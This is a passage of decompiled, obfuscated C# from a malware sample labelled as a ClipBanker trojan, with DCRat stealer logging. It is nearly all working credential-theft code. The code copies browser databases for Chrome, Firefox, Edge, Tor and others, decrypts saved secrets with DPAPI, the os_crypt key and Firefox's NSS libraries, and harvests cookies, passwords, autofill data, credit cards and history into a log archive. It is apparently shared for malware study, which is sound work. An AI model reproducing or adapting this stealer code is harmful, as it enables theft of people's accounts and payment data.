// Decompiled with JetBrains decompiler
// Type: q54.mR9
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u00315d;
using \u0031xm;
using \u0035J5;
using A6y;
using crD;
using fih;
using H16;
using l6z;
using Me6;
using OT8;
using P7S;
using p7X;
using s57;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using V89;

namespace q54
{
  internal sealed class mR9
  {
    private List<string> \u00331r = new List<string>();
    private List<string> Yr4 = new List<string>();
    private \u0032f3 x22 = (\u0032f3) null;
    private bool P28 = false;

    public byte[] \u003426(
      string _param1,
      string _param2,
      string _param3,
      string _param4,
      string _param5,
      bool _param6,
      bool _param7,
      bool _param8,
      bool _param9,
      bool _param10,
      bool _param11,
      bool _param12,
      bool _param13,
      bool _param14,
      bool _param15,
      bool _param16,
      bool _param17,
      bool _param18 = false,
      bool _param19 = false,
      bool _param20 = false)
    {
      mR9.f5o f5o = new mR9.f5o();
      f5o.\u003733 = _param6;
      f5o.U6M = _param7;
      f5o.Fq7 = _param8;
      f5o.G26 = _param10;
      f5o.y25 = _param9;
      f5o.fT8 = this;
      f5o.\u003866 = _param5;
      f5o.\u0034TV = _param1;
      f5o.\u0031Oz = _param2;
      f5o.Q51 = _param3;
      f5o.U2M = _param4;
      f5o.PO2 = _param20;
      f5o.x6B = _param19;
      f5o.zL7 = _param12;
      f5o.q77 = _param11;
      f5o.\u0033P1 = _param13;
      f5o.u2C = _param14;
      f5o.\u003917 = _param15;
      f5o.\u0038eX = _param16;
      f5o.\u00384v = _param17;
      this.P28 = _param18;
      byte[] numArray = (byte[]) null;
      f5o.\u00392D = new Dictionary<string, object>();
      f5o.RYN = new Stopwatch();
      f5o.RYN.Start();
      using (MemoryStream memoryStream = new MemoryStream())
      {
        this.x22 = new \u0032f3(Encoding.UTF8);
        this.x22.ez5 = "DCRat-Log#" + Ej4.R6b + "\r\n" + DateTime.Now.ToString("dd.MM.yyyy");
        this.x22.V49 = PIJ.\u0023h;
        Task.WaitAll(Task.Factory.StartNew(new Action(f5o.EE2)), Task.Factory.StartNew(new Action(f5o.\u003782)), Task.Factory.StartNew(new Action(f5o.\u0033h3)));
        this.\u0036b2("\r\nWork results:");
        foreach (KeyValuePair<string, object> keyValuePair in f5o.\u00392D)
          this.\u0036b2("-[" + keyValuePair.Key + "]: " + keyValuePair.Value.ToString());
        this.\u0036b2("\r\nSaving log...");
        this.aM8("~Work.log", Encoding.UTF8.GetBytes(string.Join("\r\n", (IEnumerable<string>) this.Yr4)));
        this.x22.ze3((Stream) memoryStream);
        numArray = memoryStream.ToArray();
      }
      f5o.RYN.Stop();
      f5o.\u00352a = this.\u00331r.Count;
      f5o.bR5 = string.Join("\r\n", (IEnumerable<string>) this.Yr4);
      new Thread(new ThreadStart(f5o.\u0032J2)).Start();
      this.o1v("Done! Elapsed time: " + f5o.RYN.Elapsed.ToString(), f5o.\u0034TV, f5o.\u0031Oz, f5o.Q51, f5o.U2M);
      return numArray;
    }

    void object.\u003497()
    {
      try
      {
        this.\u00331r.Clear();
        this.Yr4.Clear();
        this.\u00331r = (List<string>) null;
        this.Yr4 = (List<string>) null;
        this.x22.\u0023Nn();
      }
      finally
      {
        // ISSUE: explicit finalizer call
        this.Finalize();
      }
    }

    private void \u0036b2([In] string obj0)
    {
      try
      {
        lock (this.Yr4)
          this.Yr4.Add(obj0);
      }
      catch
      {
      }
    }

    private void aM8([In] string obj0, [In] byte[] obj1)
    {
      try
      {
        lock (this.x22)
          this.x22.Zx4(obj0, obj1);
      }
      catch
      {
      }
    }

    private void o1v([In] string obj0, [In] string obj1, [In] string obj2, [In] string obj3, [In] string obj4)
    {
      if (this.P28)
        return;
      try
      {
        g79.\u00387I("stealer", obj0, obj1, obj2, obj3, obj4);
      }
      catch
      {
      }
    }

    private List<string> \u00339t([In] string obj0)
    {
      mR9.yyq yyq = new mR9.yyq();
      yyq.\u0035c7 = this;
      yyq.\u0033v3 = new List<string>();
      yyq.\u0037dA = new object();
      try
      {
        yyq.\u0033v3.AddRange((IEnumerable<string>) Directory.GetFiles(obj0));
      }
      catch
      {
      }
      try
      {
        Parallel.ForEach<string>((IEnumerable<string>) Directory.GetDirectories(obj0), new Action<string>(yyq.JeW));
      }
      catch
      {
      }
      return yyq.\u0033v3;
    }

    private string B91([In] string obj0)
    {
      string str = "Unknown";
      if (obj0.Contains("Spotify"))
        str = "Spotify WebViewer";
      if (obj0.Contains("Discord"))
        str = "Discord WebViewer";
      if (obj0.Contains("Chrome"))
        str = "Chrome";
      if (obj0.Contains("Brave"))
        str = "Brave";
      if (obj0.Contains("Blisk"))
        str = "Blisk";
      if (obj0.Contains("Firefox"))
        str = "Firefox";
      if (obj0.Contains("Tor"))
        str = "Tor";
      if (obj0.Contains("Waterfox"))
        str = "Waterfox";
      if (obj0.Contains("Meleon"))
        str = "K-Meleon";
      if (obj0.Contains("IceDragon"))
        str = "IceDragon";
      if (obj0.Contains("Yandex"))
        str = "Yandex";
      if (obj0.Contains("Chromium"))
        str = "Chromium";
      if (obj0.Contains("Amigo"))
        str = "Amigo";
      if (obj0.Contains("Safari"))
        str = "Safari";
      if (obj0.Contains("Opera"))
        str = "Opera";
      if (obj0.Contains("Opera GX"))
        str = "Opera GX";
      if (obj0.Contains("Vivaldi"))
        str = "Vivaldi";
      if (obj0.Contains("Torch"))
        str = "Torch";
      if (obj0.Contains("Kometa"))
        str = "Kometa";
      if (obj0.Contains("Steam"))
        str = "Steam WebViewer";
      if (obj0.Contains("Edge"))
        str = "Chromium Edge";
      return str;
    }

    private string O73([In] string obj0, [In] Dictionary<string, object> obj1)
    {
      byte[] numArray = ProtectedData.Unprotect(xY7.\u003177(Convert.FromBase64String((string) ((Dictionary<string, object>) obj1["os_crypt"])["encrypted_key"]), 0, 5), (byte[]) null, DataProtectionScope.CurrentUser);
      byte[] bytes;
      try
      {
        bytes = Encoding.GetEncoding("windows-1251").GetBytes(obj0);
      }
      catch
      {
        bytes = Encoding.Default.GetBytes(obj0);
      }
      return aw8.\u00375t.\u0032rG(numArray, bytes).TrimEnd("\r\n\0".ToCharArray());
    }

    private string \u0038s2([In] string obj0)
    {
      Encoding[] encodingArray = new Encoding[2]
      {
        Encoding.GetEncoding("windows-1251"),
        Encoding.Default
      };
      foreach (Encoding encoding in encodingArray)
      {
        DataProtectionScope[] dataProtectionScopeArray = new DataProtectionScope[2]
        {
          DataProtectionScope.CurrentUser,
          DataProtectionScope.LocalMachine
        };
        foreach (DataProtectionScope scope in dataProtectionScopeArray)
        {
          try
          {
            return Encoding.Default.GetString(ProtectedData.Unprotect(encoding.GetBytes(obj0), (byte[]) null, scope));
          }
          catch
          {
          }
        }
      }
      return (string) null;
    }

    private bool \u00334Y([In] string obj0)
    {
      try
      {
        if (Encoding.Default.GetString(File.ReadAllBytes(obj0), 0, 15).CompareTo("SQLite format 3") != 0)
          return false;
      }
      catch
      {
      }
      return true;
    }

    private Dictionary<string, object> \u00345E([In] string obj0)
    {
      try
      {
        string[] strArray1 = new string[4]
        {
          "",
          "\\..",
          "\\..\\..",
          "\\..\\..\\.."
        };
        string[] strArray2 = new string[2]
        {
          "Local State",
          "LocalPrefs.json"
        };
        foreach (string str1 in strArray1)
        {
          foreach (string str2 in strArray2)
          {
            try
            {
              string path = Path.GetDirectoryName(obj0) + str1 + "\\" + str2;
              if (File.Exists(path))
                return File.ReadAllText(path).dtU<Dictionary<string, object>>();
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
      return (Dictionary<string, object>) null;
    }

    private void \u003214(
      bool _param1,
      out int _param2,
      out int _param3,
      out List<string> _param4)
    {
      _param2 = 0;
      _param3 = 0;
      _param4 = new List<string>();
      string str1 = "Cookies";
      try
      {
        List<string> all = this.\u00331r.FindAll(mR9.PU3.\u003C\u003E9__15_0 ?? (mR9.PU3.\u003C\u003E9__15_0 = new Predicate<string>(mR9.PU3.\u003C\u003E9.\u0039LX)));
        this.\u0036b2("[" + str1 + "] Elements: " + all.Count.ToString());
        if (all.Count == 0)
          return;
        foreach (string str2 in all)
        {
          this.\u0036b2("[" + str1 + "] Processing: " + str2);
          try
          {
            mR9.\u003792 obj1 = new mR9.\u003792();
            obj1.J86 = this;
            if (!File.Exists(str2) || !this.\u00334Y(str2))
            {
              this.\u0036b2("[" + str1 + "] Invalid DB: " + str2);
              continue;
            }
            obj1.YxG = new List<string>();
            string str3 = this.B91(str2);
            string str4 = xY7.B84() + "\\" + xY7.\u003842(10);
            File.Copy(str2, str4, true);
            this.\u0036b2("[" + str1 + "] Temp DB: " + str4);
            obj1.\u0034dQ = this.\u00345E(str2);
            try
            {
              mR9.\u00372Y obj2 = new mR9.\u00372Y();
              obj2.d5B = obj1;
              obj2.fo1 = new \u003174(str4);
              obj2.fo1.\u00388t("cookies");
              int toExclusive = obj2.fo1.\u0036zn();
              this.\u0036b2("[" + str1 + "] DB Rows: " + toExclusive.ToString());
              obj2.AJl = new object();
              Parallel.For(0, toExclusive, new Action<int>(obj2.\u003221));
              if (obj2.d5B.YxG.Count > 0)
              {
                if (_param1)
                {
                  _param4.AddRange((IEnumerable<string>) obj2.d5B.YxG);
                  _param4.Add("\r\n");
                }
                else
                  this.aM8((str3 == "Unknown" ? "Browsers/Unknowns/" : "Browsers/") + str1 + "[" + str3 + "]#" + xY7.\u003842(4) + ".txt", Encoding.UTF8.GetBytes(string.Join("\r\n", (IEnumerable<string>) obj2.d5B.YxG)));
                ++_param3;
                _param2 += obj2.d5B.YxG.Count;
              }
            }
            catch (Exception ex)
            {
              this.\u0036b2("[" + str1 + "] Error: " + ex.Message);
            }
            File.Delete(str4);
          }
          catch
          {
          }
          this.\u0036b2("[" + str1 + "] Processed: " + str2);
          Thread.Sleep(10);
        }
      }
      catch
      {
      }
    }

    private void \u003335(
      bool _param1,
      out int _param2,
      out int _param3,
      out List<string> _param4)
    {
      _param2 = 0;
      _param3 = 0;
      _param4 = new List<string>();
      string str1 = "Cookies";
      try
      {
        List<string> all = this.\u00331r.FindAll(mR9.PU3.\u003C\u003E9__16_0 ?? (mR9.PU3.\u003C\u003E9__16_0 = new Predicate<string>(mR9.PU3.\u003C\u003E9.b1Y)));
        this.\u0036b2("[" + str1 + "] Elements: " + all.Count.ToString());
        if (all.Count == 0)
          return;
        foreach (string str2 in all)
        {
          this.\u0036b2("[" + str1 + "] Processing: " + str2);
          try
          {
            mR9.\u0033lC obj = new mR9.\u0033lC();
            if (!File.Exists(str2) || !this.\u00334Y(str2))
            {
              this.\u0036b2("[" + str1 + "] Invalid DB: " + str2);
              continue;
            }
            obj.\u0038ey = new List<string>();
            string str3 = this.B91(str2);
            string str4 = xY7.B84() + "\\" + xY7.\u003842(10);
            File.Copy(str2, str4, true);
            this.\u0036b2("[" + str1 + "] Temp DB: " + str4);
            this.\u00345E(str2);
            try
            {
              mR9.O57 o57 = new mR9.O57();
              o57.h4K = obj;
              o57.y3x = new \u003174(str4);
              o57.y3x.\u00388t("moz_cookies");
              int toExclusive = o57.y3x.\u0036zn();
              this.\u0036b2("[" + str1 + "] DB Rows: " + toExclusive.ToString());
              o57.T47 = new object();
              Parallel.For(0, toExclusive, new Action<int>(o57.\u0036bc));
              if (o57.h4K.\u0038ey.Count > 0)
              {
                if (_param1)
                {
                  _param4.AddRange((IEnumerable<string>) o57.h4K.\u0038ey);
                  _param4.Add("\r\n");
                }
                else
                  this.aM8((str3 == "Unknown" ? "Browsers/Unknowns/" : "Browsers/") + str1 + "[" + str3 + "]#" + xY7.\u003842(4) + ".txt", Encoding.UTF8.GetBytes(string.Join("\r\n", (IEnumerable<string>) o57.h4K.\u0038ey)));
                ++_param3;
                _param2 += o57.h4K.\u0038ey.Count;
              }
            }
            catch (Exception ex)
            {
              this.\u0036b2("[" + str1 + "] Error: " + ex.Message);
            }
            File.Delete(str4);
          }
          catch
          {
          }
          this.\u0036b2("[" + str1 + "] Processed: " + str2);
          Thread.Sleep(10);
        }
      }
      catch
      {
      }
    }

    private void \u003512(
      bool _param1,
      bool _param2,
      out int _param3,
      out int _param4,
      out List<string> _param5)
    {
      mR9.\u0033v5 obj = new mR9.\u0033v5();
      obj.hN6 = this;
      obj.\u0033LJ = _param2;
      _param3 = 0;
      _param4 = 0;
      _param5 = new List<string>();
      string str1 = "Passwords";
      try
      {
        List<string> all = this.\u00331r.FindAll(mR9.PU3.\u003C\u003E9__17_0 ?? (mR9.PU3.\u003C\u003E9__17_0 = new Predicate<string>(mR9.PU3.\u003C\u003E9.\u0039Yc)));
        this.\u0036b2("[" + str1 + "] Elements: " + all.Count.ToString());
        if (all.Count == 0)
          return;
        foreach (string str2 in all)
        {
          this.\u0036b2("[" + str1 + "] Processing: " + str2);
          try
          {
            mR9.O3B o3B = new mR9.O3B();
            o3B.y99 = obj;
            if (!File.Exists(str2) || !this.\u00334Y(str2))
            {
              this.\u0036b2("[" + str1 + "] Invalid DB: " + str2);
              continue;
            }
            o3B.f55 = new List<string>();
            string str3 = this.B91(str2);
            string str4 = xY7.B84() + "\\" + xY7.\u003842(10);
            File.Copy(str2, str4, true);
            this.\u0036b2("[" + str1 + "] Temp DB: " + str4);
            o3B.\u003283 = this.\u00345E(str2);
            try
            {
              mR9.RCI rci = new mR9.RCI();
              rci.\u003479 = o3B;
              rci.x2P = new \u003174(str4);
              rci.x2P.\u00388t("logins");
              int toExclusive = rci.x2P.\u0036zn();
              this.\u0036b2("[" + str1 + "] DB Rows: " + toExclusive.ToString());
              rci.y91 = new object();
              Parallel.For(0, toExclusive, new Action<int>(rci.M2A));
              if (rci.\u003479.f55.Count > 0)
              {
                if (_param1)
                  _param5.AddRange((IEnumerable<string>) rci.\u003479.f55);
                else
                  this.aM8((str3 == "Unknown" ? "Browsers/Unknowns/" : "Browsers/") + str1 + "[" + str3 + "]#" + xY7.\u003842(4) + ".txt", Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", (IEnumerable<string>) rci.\u003479.f55)));
                ++_param4;
                _param3 += rci.\u003479.f55.Count;
              }
            }
            catch (Exception ex)
            {
              this.\u0036b2("[" + str1 + "] Error: " + ex.Message);
            }
            File.Delete(str4);
          }
          catch
          {
          }
          this.\u0036b2("[" + str1 + "] Processed: " + str2);
          Thread.Sleep(10);
        }
      }
      catch
      {
      }
    }

    private void \u0032SL(
      bool _param1,
      bool _param2,
      out int _param3,
      out int _param4,
      out List<string> _param5)
    {
      mR9.KtU ktU = new mR9.KtU();
      ktU.\u0035O9 = _param2;
      _param3 = 0;
      _param4 = 0;
      _param5 = new List<string>();
      string str1 = "Passwords";
      try
      {
        List<string> all = this.\u00331r.FindAll(mR9.PU3.\u003C\u003E9__18_0 ?? (mR9.PU3.\u003C\u003E9__18_0 = new Predicate<string>(mR9.PU3.\u003C\u003E9.\u003464)));
        this.\u0036b2("[" + str1 + "] Elements: " + all.Count.ToString());
        if (all.Count == 0)
          return;
        foreach (string path in all)
        {
          this.\u0036b2("[" + str1 + "] Processing: " + path);
          try
          {
            mR9.X2T x2T = new mR9.X2T();
            x2T.\u003233 = ktU;
            if (!File.Exists(path))
            {
              this.\u0036b2("[" + str1 + "] Invalid DB: " + path);
              continue;
            }
            x2T.X58 = new List<string>();
            string str2 = this.B91(path);
            string empty1 = string.Empty;
            string empty2 = string.Empty;
            string empty3 = string.Empty;
            string empty4 = string.Empty;
            if (!Directory.Exists(Path.Combine(Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)), "Users\\Public") + "\\" + Path.GetFileName(Path.GetDirectoryName(path))))
              Directory.CreateDirectory(Path.Combine(Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)), "Users\\Public") + "\\" + Path.GetFileName(Path.GetDirectoryName(path)));
            if (File.Exists(Path.GetDirectoryName(path) + "\\key3.db"))
            {
              string destFileName = Path.Combine(Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)), "Users\\Public") + "\\" + Path.GetFileName(Path.GetDirectoryName(path)) + "\\key3.db";
              File.Copy(Path.GetDirectoryName(path) + "\\key3.db", destFileName, true);
            }
            if (File.Exists(Path.GetDirectoryName(path) + "\\key4.db"))
            {
              string destFileName = Path.Combine(Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)), "Users\\Public") + "\\" + Path.GetFileName(Path.GetDirectoryName(path)) + "\\key4.db";
              File.Copy(Path.GetDirectoryName(path) + "\\key4.db", destFileName, true);
            }
            if (File.Exists(Path.GetDirectoryName(path) + "\\logins.json"))
            {
              string str3 = Path.Combine(Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)), "Users\\Public") + "\\" + Path.GetFileName(Path.GetDirectoryName(path)) + "\\logins.json";
              File.Copy(Path.GetDirectoryName(path) + "\\logins.json", str3, true);
              if (File.Exists(Path.GetDirectoryName(path) + "\\cert9.db"))
              {
                string destFileName = Path.Combine(Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)), "Users\\Public") + "\\" + Path.GetFileName(Path.GetDirectoryName(path)) + "\\cert9.db";
                File.Copy(Path.GetDirectoryName(path) + "\\cert9.db", destFileName, true);
              }
              this.\u0036b2("[" + str1 + "] Temp DB: " + str3);
              try
              {
                string str4 = string.Empty;
                foreach (string str5 in W61.F53())
                {
                  if (File.Exists(str5 + "\\nss3.dll") && File.Exists(str5 + "\\mozglue.dll"))
                  {
                    str4 = str5;
                    break;
                  }
                }
                if (!string.IsNullOrWhiteSpace(str4))
                {
                  Dictionary<string, object> dictionary = File.ReadAllText(str3).dtU<Dictionary<string, object>>();
                  if (W61.\u0031M8(str4))
                  {
                    mR9.\u0036g7 obj = new mR9.\u0036g7();
                    obj.\u003842 = x2T;
                    W61.\u003956(Path.GetDirectoryName(str3));
                    List<object> source = (List<object>) dictionary["logins"];
                    int num = source.Count<object>();
                    this.\u0036b2("[" + str1 + "] DB Rows: " + num.ToString());
                    obj.V16 = new object();
                    Parallel.ForEach<object>((IEnumerable<object>) source, new Action<object>(obj.goC));
                    W61.\u003637();
                    if (obj.\u003842.X58.Count > 0)
                    {
                      if (_param1)
                        _param5.AddRange((IEnumerable<string>) obj.\u003842.X58);
                      else
                        this.aM8((str2 == "Unknown" ? "Browsers/Unknowns/" : "Browsers/") + str1 + "[" + str2 + "]#" + xY7.\u003842(4) + ".txt", Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", (IEnumerable<string>) obj.\u003842.X58)));
                      ++_param4;
                      _param3 += obj.\u003842.X58.Count;
                    }
                  }
                }
                else
                  continue;
              }
              catch (Exception ex)
              {
                this.\u0036b2("[" + str1 + "] Error: " + ex.Message);
              }
              Directory.Delete(Path.Combine(Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)), "Users\\Public") + "\\" + Path.GetFileName(Path.GetDirectoryName(path)), true);
            }
            else
              continue;
          }
          catch
          {
            this.\u0036b2("[" + str1 + "] Invalid DB: " + path);
          }
          this.\u0036b2("[" + str1 + "] Processed: " + path);
          Thread.Sleep(10);
        }
      }
      catch
      {
      }
    }

    private void lnH(
      bool _param1,
      bool _param2,
      out int _param3,
      out int _param4,
      out List<string> _param5)
    {
      mR9.\u0035kF obj1 = new mR9.\u0035kF();
      obj1.\u00364g = _param2;
      _param3 = 0;
      _param4 = 0;
      _param5 = new List<string>();
      string str1 = "Forms";
      try
      {
        List<string> all = this.\u00331r.FindAll(mR9.PU3.\u003C\u003E9__19_0 ?? (mR9.PU3.\u003C\u003E9__19_0 = new Predicate<string>(mR9.PU3.\u003C\u003E9.IT2)));
        this.\u0036b2("[" + str1 + "] Elements: " + all.Count.ToString());
        if (all.Count == 0)
          return;
        foreach (string str2 in all)
        {
          this.\u0036b2("[" + str1 + "] Processing: " + str2);
          try
          {
            mR9.mA8 mA8 = new mR9.mA8();
            mA8.Zk3 = obj1;
            if (!File.Exists(str2) || !this.\u00334Y(str2))
            {
              this.\u0036b2("[" + str1 + "] Invalid DB: " + str2);
              continue;
            }
            mA8.H7y = new List<string>();
            string str3 = this.B91(str2);
            string str4 = xY7.B84() + "\\" + xY7.\u003842(10);
            File.Copy(str2, str4, true);
            this.\u0036b2("[" + str1 + "] Temp DB: " + str4);
            this.\u00345E(str2);
            try
            {
              mR9.\u0038GA obj2 = new mR9.\u0038GA();
              obj2.GCp = mA8;
              obj2.nub = new \u003174(str4);
              obj2.nub.\u00388t("autofill");
              int toExclusive = obj2.nub.\u0036zn();
              this.\u0036b2("[" + str1 + "] DB Rows: " + toExclusive.ToString());
              obj2.Qi6 = new object();
              Parallel.For(0, toExclusive, new Action<int>(obj2.Es2));
              if (obj2.GCp.H7y.Count > 0)
              {
                if (_param1)
                  _param5.AddRange((IEnumerable<string>) obj2.GCp.H7y);
                else
                  this.aM8((str3 == "Unknown" ? "Browsers/Unknowns/" : "Browsers/") + str1 + "[" + str3 + "]#" + xY7.\u003842(4) + ".txt", Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", (IEnumerable<string>) obj2.GCp.H7y)));
                ++_param4;
                _param3 += obj2.GCp.H7y.Count;
              }
            }
            catch (Exception ex)
            {
              this.\u0036b2("[" + str1 + "] Error: " + ex.Message);
            }
            File.Delete(str4);
          }
          catch
          {
          }
          this.\u0036b2("[" + str1 + "] Processed: " + str2);
          Thread.Sleep(10);
        }
      }
      catch
      {
      }
    }

    private void kZ9(
      bool _param1,
      bool _param2,
      out int _param3,
      out int _param4,
      out List<string> _param5)
    {
      mR9.p75 p75 = new mR9.p75();
      p75.Wk5 = _param2;
      _param3 = 0;
      _param4 = 0;
      _param5 = new List<string>();
      string str1 = "Forms";
      try
      {
        List<string> all = this.\u00331r.FindAll(mR9.PU3.\u003C\u003E9__20_0 ?? (mR9.PU3.\u003C\u003E9__20_0 = new Predicate<string>(mR9.PU3.\u003C\u003E9.\u003888)));
        this.\u0036b2("[" + str1 + "] Elements: " + all.Count.ToString());
        if (all.Count == 0)
          return;
        foreach (string str2 in all)
        {
          this.\u0036b2("[" + str1 + "] Processing: " + str2);
          try
          {
            mR9.mx6 mx6 = new mR9.mx6();
            mx6.GIf = p75;
            if (!File.Exists(str2) || !this.\u00334Y(str2))
            {
              this.\u0036b2("[" + str1 + "] Invalid DB: " + str2);
              continue;
            }
            mx6.\u0037Sq = new List<string>();
            string str3 = this.B91(str2);
            string str4 = xY7.B84() + "\\" + xY7.\u003842(10);
            File.Copy(str2, str4, true);
            this.\u0036b2("[" + str1 + "] Temp DB: " + str4);
            this.\u00345E(str2);
            try
            {
              mR9.e27 e27 = new mR9.e27();
              e27.\u0034QE = mx6;
              e27.\u0031BG = new \u003174(str4);
              e27.\u0031BG.\u00388t("moz_formhistory");
              int toExclusive = e27.\u0031BG.\u0036zn();
              this.\u0036b2("[" + str1 + "] DB Rows: " + toExclusive.ToString());
              e27.\u003931 = new object();
              Parallel.For(0, toExclusive, new Action<int>(e27.N7h));
              if (e27.\u0034QE.\u0037Sq.Count > 0)
              {
                if (_param1)
                  _param5.AddRange((IEnumerable<string>) e27.\u0034QE.\u0037Sq);
                else
                  this.aM8((str3 == "Unknown" ? "Browsers/Unknowns/" : "Browsers/") + str1 + "[" + str3 + "]#" + xY7.\u003842(4) + ".txt", Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", (IEnumerable<string>) e27.\u0034QE.\u0037Sq)));
                ++_param4;
                _param3 += e27.\u0034QE.\u0037Sq.Count;
              }
            }
            catch (Exception ex)
            {
              this.\u0036b2("[" + str1 + "] Error: " + ex.Message);
            }
            File.Delete(str4);
          }
          catch
          {
          }
          this.\u0036b2("[" + str1 + "] Processed: " + str2);
          Thread.Sleep(10);
        }
      }
      catch
      {
      }
    }

    private void I87(
      bool _param1,
      bool _param2,
      out int _param3,
      out int _param4,
      out List<string> _param5)
    {
      mR9.\u003844 obj = new mR9.\u003844();
      obj.LtT = this;
      obj.\u00339T = _param2;
      _param3 = 0;
      _param4 = 0;
      _param5 = new List<string>();
      string str1 = "CC";
      try
      {
        List<string> all = this.\u00331r.FindAll(mR9.PU3.\u003C\u003E9__21_0 ?? (mR9.PU3.\u003C\u003E9__21_0 = new Predicate<string>(mR9.PU3.\u003C\u003E9.w5T)));
        this.\u0036b2("[" + str1 + "] Elements: " + all.Count.ToString());
        if (all.Count == 0)
          return;
        foreach (string str2 in all)
        {
          this.\u0036b2("[" + str1 + "] Processing: " + str2);
          try
          {
            mR9.kmX kmX = new mR9.kmX();
            kmX.\u0036Eo = obj;
            if (!File.Exists(str2) || !this.\u00334Y(str2))
            {
              this.\u0036b2("[" + str1 + "] Invalid DB: " + str2);
              continue;
            }
            kmX.\u003629 = new List<string>();
            string str3 = this.B91(str2);
            string str4 = xY7.B84() + "\\" + xY7.\u003842(10);
            File.Copy(str2, str4, true);
            this.\u0036b2("[" + str1 + "] Temp DB: " + str4);
            kmX.\u00337A = this.\u00345E(str2);
            try
            {
              mR9.hR8 hR8 = new mR9.hR8();
              hR8.kx4 = kmX;
              hR8.\u0033QQ = new \u003174(str4);
              hR8.\u0033QQ.\u00388t("credit_cards");
              int toExclusive = hR8.\u0033QQ.\u0036zn();
              this.\u0036b2("[" + str1 + "] DB Rows: " + toExclusive.ToString());
              hR8.\u00355L = new object();
              Parallel.For(0, toExclusive, new Action<int>(hR8.dF3));
              if (hR8.kx4.\u003629.Count > 0)
              {
                if (_param1)
                  _param5.AddRange((IEnumerable<string>) hR8.kx4.\u003629);
                else
                  this.aM8((str3 == "Unknown" ? "Browsers/Unknowns/" : "Browsers/") + str1 + "[" + str3 + "]#" + xY7.\u003842(4) + ".txt", Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", (IEnumerable<string>) hR8.kx4.\u003629)));
                ++_param4;
                _param3 += hR8.kx4.\u003629.Count;
              }
            }
            catch (Exception ex)
            {
              this.\u0036b2("[" + str1 + "] Error: " + ex.Message);
            }
            File.Delete(str4);
          }
          catch
          {
          }
          this.\u0036b2("[" + str1 + "] Processed: " + str2);
          Thread.Sleep(10);
        }
      }
      catch
      {
      }
    }

    private void \u0031ds(
      bool _param1,
      bool _param2,
      out int _param3,
      out int _param4,
      out List<string> _param5)
    {
      mR9.Y8o y8o = new mR9.Y8o();
      y8o.\u003629 = _param2;
      _param3 = 0;
      _param4 = 0;
      _param5 = new List<string>();
      string str1 = "History";
      try
      {
        List<string> all = this.\u00331r.FindAll(mR9.PU3.\u003C\u003E9__22_0 ?? (mR9.PU3.\u003C\u003E9__22_0 = new Predicate<string>(mR9.PU3.\u003C\u003E9.v7L)));
        this.\u0036b2("[" + str1 + "] Elements: " + all.Count.ToString());
        if (all.Count == 0)
          return;
        foreach (string str2 in all)
        {
          this.\u0036b2("[" + str1 + "] Processing: " + str2);
          try
          {
            mR9.\u0034Us obj = new mR9.\u0034Us();
            obj.JkW = y8o;
            if (!File.Exists(str2) || !this.\u00334Y(str2))
            {
              this.\u0036b2("[" + str1 + "] Invalid DB: " + str2);
              continue;
            }
            obj.\u0032dR = new List<string>();
            string str3 = this.B91(str2);
            string str4 = xY7.B84() + "\\" + xY7.\u003842(10);
            File.Copy(str2, str4, true);
            this.\u0036b2("[" + str1 + "] Temp DB: " + str4);
            this.\u00345E(str2);
            try
            {
              mR9.f3y f3y = new mR9.f3y();
              f3y.\u0039a9 = obj;
              f3y.L38 = new \u003174(str4);
              f3y.L38.\u00388t("urls");
              int toExclusive = f3y.L38.\u0036zn();
              this.\u0036b2("[" + str1 + "] DB Rows: " + toExclusive.ToString());
              f3y.m1l = new object();
              Parallel.For(0, toExclusive, new Action<int>(f3y.\u0034p4));
              if (f3y.\u0039a9.\u0032dR.Count > 0)
              {
                if (_param1)
                  _param5.AddRange((IEnumerable<string>) f3y.\u0039a9.\u0032dR);
                else
                  this.aM8((str3 == "Unknown" ? "Browsers/Unknowns/" : "Browsers/") + str1 + "[" + str3 + "]#" + xY7.\u003842(4) + ".txt", Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", (IEnumerable<string>) f3y.\u0039a9.\u0032dR)));
                ++_param4;
                _param3 += f3y.\u0039a9.\u0032dR.Count;
              }
            }
            catch (Exception ex)
            {
              this.\u0036b2("[" + str1 + "] Error: " + ex.Message);
            }
            File.Delete(str4);
          }
          catch
          {
          }
          this.\u0036b2("[" + str1 + "] Processed: " + str2);
          Thread.Sleep(10);
        }
      }
      catch
      {
      }
    }

    private void \u003591(
      bool _param1,
      bool _param2,
      out int _param3,
      out int _param4,
      out List<string> _param5)
    {
      mR9.\u00374h obj1 = new mR9.\u00374h();
      obj1.\u0033d3 = _param2;
      _param3 = 0;
      _param4 = 0;
      _param5 = new List<string>();
      string str1 = "History";
      try
      {
        List<string> all = this.\u00331r.FindAll(mR9.PU3.\u003C\u003E9__23_0 ?? (mR9.PU3.\u003C\u003E9__23_0 = new Predicate<string>(mR9.PU3.\u003C\u003E9.r2T)));
        this.\u0036b2("[" + str1 + "] Elements: " + all.Count.ToString());
        if (all.Count == 0)
          return;
        foreach (string str2 in all)
        {
          this.\u0036b2("[" + str1 + "] Processing: " + str2);
          try
          {
            mR9.Se8 se8 = new mR9.Se8();
            se8.F81 = obj1;
            if (!File.Exists(str2) || !this.\u00334Y(str2))
            {
